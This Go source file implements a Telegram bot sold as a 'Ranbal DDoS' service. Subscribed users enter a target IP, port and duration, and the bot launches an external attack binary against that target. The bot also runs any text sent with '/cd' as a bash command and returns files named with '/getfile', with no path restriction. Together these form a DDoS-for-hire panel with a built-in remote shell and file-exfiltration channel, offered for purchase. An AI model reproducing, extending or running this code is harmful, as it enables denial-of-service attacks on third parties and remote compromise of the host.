package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

var ownerChatIDs = []int64{6245146330, 5759284972}
var config Config
var userDataFile = "user_data.json"
var configFile = "config.json"
var authorizedUsers map[int64]User
var userAttackData = make(map[int64]AttackData)
var currentAttackerID int64
var attackDataFile = "attack_data.txt"
var runningCmd *exec.Cmd
var isAttackRunning = false
var pid int

type Config struct {
	BotToken string `json:"bot_token"`
	AdminID  int64  `json:"admin_id"`
	Logging  bool   `json:"logging"`
}

type User struct {
	ChatID    int64     `json:"chat_id"`
	ExpiresAt time.Time `json:"expires_at"`
}

type AttackData struct {
	IP       string `json:"ip"`
	Port     string `json:"port"`
	Duration string `json:"duration"`
}

func listUsers(bot *tgbotapi.BotAPI, chatID int64) {
	isOwner := false
	for _, id := range ownerChatIDs {
		if chatID == id {
			isOwner = true
			break
		}
	}

	if !isOwner {
		msg := tgbotapi.NewMessage(chatID, "❌ You are not authorized to use this command.")
		bot.Send(msg)
		return
	}

	var usersList string
	for _, user := range authorizedUsers {
		remaining := time.Until(user.ExpiresAt).Hours() / 24
		usersList += fmt.Sprintf("ChatID: %d, Expires in: %.0f days\n", user.ChatID, remaining)
	}

	if usersList == "" {
		usersList = "No authorized users found."
	}

	msg := tgbotapi.NewMessage(chatID, "📋 *Authorized Users:*\n\n"+usersList)
	msg.ParseMode = "Markdown"
	bot.Send(msg)
}

// List all admins (Owner only)
func listAdmins(bot *tgbotapi.BotAPI, chatID int64) {
	isOwner := false
	for _, id := range ownerChatIDs {
		if chatID == id {
			isOwner = true
			break
		}
	}

	if !isOwner {
		msg := tgbotapi.NewMessage(chatID, "❌ You are not authorized to use this command.")
		bot.Send(msg)
		return
	}

	adminList := fmt.Sprintf("AdminID: %d\n", config.AdminID)

	msg := tgbotapi.NewMessage(chatID, "📋 *Admins:*\n\n"+adminList)
	msg.ParseMode = "Markdown"
	bot.Send(msg)
}

func loadUserAttackData(chatID int64) (string, string, string, error) {
	// User-specific file for loading attack data
	userDataFile := fmt.Sprintf("attack_data_%d.txt", chatID)
	data, err := os.ReadFile(userDataFile)
	if err != nil {
		return "", "", "", err
	}

	parts := strings.Split(string(data), ",")
	if len(parts) != 3 {
		return "", "", "", fmt.Errorf("❌ Invalid data format")
	}

	return parts[0], parts[1], parts[2], nil
}

func saveUserAttackData(chatID int64, ip, port, duration string) error {
	if !isValidIP(ip) {
		return fmt.Errorf("❌ Invalid IP address")
	}
	if !isValidPort(port) {
		return fmt.Errorf("❌ Invalid port number")
	}

	if duration != "" {
		_, err := strconv.Atoi(duration) // Ensure duration is an integer
		if err != nil {
			return fmt.Errorf("❌ Invalid duration, must be a number")
		}
	}

	userDataFile := fmt.Sprintf("attack_data_%d.txt", chatID)
	data := fmt.Sprintf("%s,%s,%s", ip, port, duration)
	return os.WriteFile(userDataFile, []byte(data), 0644)
}

func loadConfig() (Config, error) {
	file, err := os.Open(configFile)
	if err != nil {
		return Config{}, err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	config := Config{}
	err = decoder.Decode(&config)
	return config, err
}

func saveAuthorizedUsers() error {
	file, err := os.Create(userDataFile)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	return encoder.Encode(authorizedUsers)
}

func loadAuthorizedUsers() error {
	file, err := os.Open(userDataFile)
	if err != nil {
		authorizedUsers = make(map[int64]User) // If no file exists, start with an empty map
		return nil
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	return decoder.Decode(&authorizedUsers)
}

func isUserAuthorized(chatID int64) bool {
	user, exists := authorizedUsers[chatID]
	if !exists {
		return false
	}
	if time.Now().After(user.ExpiresAt) {
		// Remove the user from authorized list if expired
		delete(authorizedUsers, chatID)
		saveAuthorizedUsers()
		return false
	}
	return true
}

func addUser(chatID int64, days int) {
	expiration := time.Now().AddDate(0, 0, days) // Expiration date set based on provided days
	authorizedUsers[chatID] = User{
		ChatID:    chatID,
		ExpiresAt: expiration,
	}
	saveAuthorizedUsers()
}

func removeUser(chatID int64) {
	delete(authorizedUsers, chatID)
	saveAuthorizedUsers()
}

func isValidIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func isValidPort(port string) bool {
	p, err := strconv.Atoi(port)
	return err == nil && p > 0 && p <= 65535
}

func check_expiration() {
	expiryDate := "2024-11-28"

	expiry, err := time.Parse("2006-01-02", expiryDate)
	if err != nil {
		fmt.Println("Error: Invalid expiry date format. Please use YYYY-MM-DD format.")
		os.Exit(1)
	}

	currentDate := time.Now()

	if currentDate.Before(expiry) {
		fmt.Println("\n\033[1;3;4;31mWELCOME BROTHER....\033[0m")
	} else {
		fmt.Println("\nthis script has expired! please contact to\033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}
}

func clearAttackData(chatID int64) error {
	userDataFile := fmt.Sprintf("attack_data_%d.txt", chatID)

	if _, err := os.Stat(userDataFile); os.IsNotExist(err) {
		return fmt.Errorf("⚠️ No attack data to clear!")
	}

	return os.Remove(userDataFile)
}

func startAttack(ip, port, duration string) error {
	if isAttackRunning {
		return fmt.Errorf("⚠️ Another attack is already running. Please stop or clear the current attack first.")
	}
	args := []string{ip, port}
	if duration != "" {
		args = append(args, duration)
	}

	runningCmd = exec.Command("./ranbal", args...) 
	runningCmd.Stdout = os.Stdout
	runningCmd.Stderr = os.Stderr
	err := runningCmd.Start()
	if err != nil {
		return err
	}

	pid = runningCmd.Process.Pid
	isAttackRunning = true
	log.Println("🚀 Ranbal attack started with PID:", pid)
	return nil
}


func stopAttack() error {
	if !isAttackRunning {
		return fmt.Errorf("❌ No attack is currently running")
	}

	
	if err := syscall.Kill(pid, syscall.SIGTERM); err != nil {
		return fmt.Errorf("❌ Failed to stop the process: %v", err)
	}

	isAttackRunning = false
	log.Println("🛑 Ranbal attack stopped")
	return nil
}

func isAdminOrOwner(userID int64) bool {
	if userID == config.AdminID {
		return true
	}
	for _, id := range ownerChatIDs {
		if userID == id {
			return true
		}
	}
	return false
}

func handleHelpCommand(bot *tgbotapi.BotAPI, chatID int64) {
	helpMessage := ` 
*📌 Bot Usage Guide 📌*

*Welcome to the Ranbal DDoS!* 👇

*🔹 Available Buttons Usage:*
    - ⚡ *Ranbal Attack* - Configure IP & Port.
    - ▶️ *Start* - Start attack with the saved IP Port.
    - ⏹ *Stop* - Stop the running attack.
    - 🧹 *Clear Ranbal Attack* - Prepare for a new attack.

*🔸 Available Commands:*
    - /start - For bot start or refresh.
    - /contact - For contact details.
    - /usersbyme - Only for Owner.
    - /adminsbyme - Only for Owner.
    - /myinfo - For your info (coming soon).

*🔸 Owner Details:*
     *Name:* MrRandom
     *Contact:* @MrRanDom8
     *For purchase or queries, contact Owner.*

⚠️ Please use the bot responsibly and avoid misuse.

*Happy Gaming dude!*

🚀 _Powered by_ *BALVEER VAISHNAV* 🚀
	`
	msg := tgbotapi.NewMessage(chatID, helpMessage)
	msg.ParseMode = "Markdown"
	bot.Send(msg)
}


func mainKeyboard() tgbotapi.ReplyKeyboardMarkup {
	return tgbotapi.NewReplyKeyboard(
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("⚡ Ranbal Attack"),
			tgbotapi.NewKeyboardButton("▶️ Start"),
			tgbotapi.NewKeyboardButton("⏹ Stop"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("❌ Clear Ranbal Attack"),
		),
	)
}

func main() {
    check_expiration()
    config, err := loadConfig() 
    if err != nil {
        log.Fatalf("⚠️ Failed to load config: %v", err)
    }

    err = loadAuthorizedUsers()
    if err != nil {
        log.Fatalf("⚠️ Failed to load user data: %v", err)
    }

    bot, err := tgbotapi.NewBotAPI(config.BotToken)
    if err != nil {
        log.Panic(err)
    }

    if config.Logging {
        logFile, err := os.OpenFile("bot.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
            log.Fatal(err)
        }
        defer logFile.Close()
        log.SetOutput(logFile)
    }

    u := tgbotapi.NewUpdate(0)
    u.Timeout = 60
    updates, err := bot.GetUpdatesChan(u)

    for update := range updates { 
		if update.Message == nil {
			continue
		}
	
		userID := update.Message.Chat.ID
	
		
		isOwner := false
		for _, id := range ownerChatIDs {
			if userID == id {
				isOwner = true
				break
			}
		}
	
		
		if !isOwner && userID != config.AdminID && !isUserAuthorized(userID) {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ You are not authorized to use this bot.")
			bot.Send(msg)
			continue
		}
	
		
		if strings.HasPrefix(update.Message.Text, "/add") || strings.HasPrefix(update.Message.Text, "/remove") {
			if !isOwner && userID != config.AdminID {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🚫 Only admins and owners can use this command.")
				bot.Send(msg)
				continue
			}
	
			if strings.HasPrefix(update.Message.Text, "/add") {
				parts := strings.Fields(update.Message.Text)
				if len(parts) != 3 {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "⚠️ Usage: /add <chatid> <days>")
					bot.Send(msg)
					continue
				}
	
				chatID, err := strconv.ParseInt(parts[1], 10, 64)
				if err != nil {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Invalid chat ID format.")
					bot.Send(msg)
					continue
				}
	
				days, err := strconv.Atoi(parts[2])
				if err != nil {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Invalid number of days.")
					bot.Send(msg)
					continue
				}
	
				addUser(chatID, days)
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("✅ User %d added for %d days.", chatID, days))
				bot.Send(msg)
				continue
			}
	
			if strings.HasPrefix(update.Message.Text, "/remove") {
				parts := strings.Fields(update.Message.Text)
				if len(parts) != 2 {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "⚠️ Usage: /remove <chatid>")
					bot.Send(msg)
					continue
				}
	
				chatID, err := strconv.ParseInt(parts[1], 10, 64)
				if err != nil {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Invalid chat ID format.")
					bot.Send(msg)
					continue
				}
	
				removeUser(chatID)
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("✅ User %d removed.", chatID))
				bot.Send(msg)
				continue
			}
		} else if update.Message.IsCommand() && update.Message.Command() == "ip" {
			
			cmd := exec.Command("curl", "ipinfo.io")
			output, err := cmd.Output()
			if err != nil {
				log.Printf("Error running curl command: %v", err)
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Failed to fetch IP information.")
				bot.Send(msg)
				continue
			}
	
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, string(output))
			bot.Send(msg)
	
		} else if strings.HasPrefix(update.Message.Text, "/cd ") {
			commandText := strings.TrimSpace(strings.TrimPrefix(update.Message.Text, "/cd "))
	
			if commandText == "" {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "⚠️ Usage: /cd <command>")
				bot.Send(msg)
				continue
			}
	
			
			cmd := exec.Command("bash", "-c", commandText)
			output, err := cmd.CombinedOutput()
	
			
			if err != nil {
				errorMsg := fmt.Sprintf("❌ Command failed: %v\n", err)
				if len(output) > 0 {
					errorMsg += fmt.Sprintf("Output:\n%s", string(output))
				} else {
					errorMsg += "No output from command."
				}
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, errorMsg)
				bot.Send(msg)
			} else if len(output) == 0 {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "⚠️ Command executed but no output was produced.")
				bot.Send(msg)
			} else {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("✅ Command Output:\n%s", string(output)))
				bot.Send(msg)
			}
		} else {
			// Any other authorized command
			// msg := tgbotapi.NewMessage(update.Message.Chat.ID, "✅ Command executed successfully.")
			// bot.Send(msg)
		}

		if update.Message.IsCommand() && update.Message.Command() == "getfile" {
			
			filename := update.Message.CommandArguments()
			if filename == "" {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🚫 Please specify the filename.")
				bot.Send(msg)
				continue
			}

			
			filePath := filepath.Join(".", filename)

			// Check if the file exists
			if _, err := os.Stat(filePath); os.IsNotExist(err) {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🚫 File not found: "+filename)
				bot.Send(msg)
				continue
			}

			// Send the file
			file := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, filePath)
			file.Caption = "Here is your file: " + filename
			_, err := bot.Send(file)
			if err != nil {
				log.Printf("Failed to send file: %v", err)
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🚫 Failed to send the file.")
				bot.Send(msg)
			}
		}	

		switch update.Message.Text {
		case "/start":
			welcomeMsg := `👋 *Welcome to RANBAL DDoS Bot!*
        
    🚀 _Choose your actions below_:
        
    ⚡ *Ranbal Attack* - Configure IP & Port.
    ▶️ *Start* - Start attack with the saved IP Port.
    ⏹ *Stop* - Stop the running attack.
    🧹 *Clear Ranbal Attack* - Prepare for a new attack.

    💡 *Commands*:
          /help - For any assistance or queries.
        
    ❓ For more info, contact: *@MrRanDom8*
    👨‍💻 This bot is crafted by: *BALVEER VAISHNAV*
        `
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, welcomeMsg)
			msg.ReplyMarkup = mainKeyboard() 
			msg.ParseMode = "Markdown"
			bot.Send(msg)

		case "⚡ Ranbal Attack":
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Please enter IP, Port, and optional Time (e.g. `192.168.1.1 8080 60`):")
			msg.ParseMode = "Markdown"
			bot.Send(msg)

		case "▶️ Start":
			// Load user-specific attack data
			ip, port, duration, err := loadUserAttackData(update.Message.Chat.ID) // Use user-specific data
			if err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "⚠️ No attack data found! Please press *Ranbal Attack* first.")
				msg.ParseMode = "Markdown"
				bot.Send(msg)
				continue
			}

			// Attempt to start the attack
			if err := startAttack(ip, port, duration); err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Failed to start attack: "+err.Error())
				bot.Send(msg)
			} else {
				currentAttackerID = update.Message.Chat.ID 
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🚀 *Ranbal attack started by @MrRanDom8 !*")
				msg.ParseMode = "Markdown"
				bot.Send(msg)
			}

		case "⏹ Stop":
			// Ensure that only the user who started the attack or the admin can stop it
			isOwner := false
			for _, id := range ownerChatIDs {
				if update.Message.Chat.ID == id {
					isOwner = true
					break
				}
			}

			if update.Message.Chat.ID != currentAttackerID && update.Message.Chat.ID != config.AdminID && !isOwner {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ You are not authorized to stop this attack.")
				bot.Send(msg)
				continue
			}

			
			if err := stopAttack(); err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Failed to stop attack: "+err.Error())
				bot.Send(msg)
			} else {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🛑 *Ranbal attack stopped by @MrRanDom8 !*")
				msg.ParseMode = "Markdown"
				bot.Send(msg)
			}

		case "❌ Clear Ranbal Attack":
			
			isOwner := false
			for _, id := range ownerChatIDs {
				if update.Message.Chat.ID == id {
					isOwner = true
					break
				}
			}

			if update.Message.Chat.ID != currentAttackerID && update.Message.Chat.ID != config.AdminID && !isOwner {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ You are not authorized to clear this attack.")
				bot.Send(msg)
				continue
			}


			if err := clearAttackData(update.Message.Chat.ID); err != nil { // Pass chatID to clearAttackData
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, err.Error()) 
				bot.Send(msg)
			} else {
				if isAttackRunning {
					stopAttack() 
				}
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🧹 *Attack data cleared.* Ready for a new attack!\nThanks for using *Balveer's Bot*")
				msg.ParseMode = "Markdown"
				bot.Send(msg)
			}

		case "/help":
			// Help command ka response
			handleHelpCommand(bot, update.Message.Chat.ID)

		case "/usersbyme":
			listUsers(bot, update.Message.Chat.ID) // Only owner can access

		case "/adminsbyme":
			listAdmins(bot, update.Message.Chat.ID) // Only owner can access

		default:
			// Handle IP, Port, and optional Time input
			parts := strings.Fields(update.Message.Text)
			if len(parts) < 2 {
				// msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Please enter at least IP and Port.")
				// bot.Send(msg)
				continue
			}

			ip := parts[0]
			port := parts[1]
			duration := ""

			// Check if a third argument for duration is provided
			if len(parts) == 3 {
				duration = parts[2]
			}

			// Save attack data specific to the current user
			err := saveUserAttackData(update.Message.Chat.ID, ip, port, duration) // New function here
			if err != nil {
				// msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ Failed to save attack data: "+err.Error())
				// bot.Send(msg)
			} else {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "✅ *Attack data saved!* Press *Start* to begin.")
				msg.ParseMode = "Markdown"
				bot.Send(msg)
			}

		}
	}
}
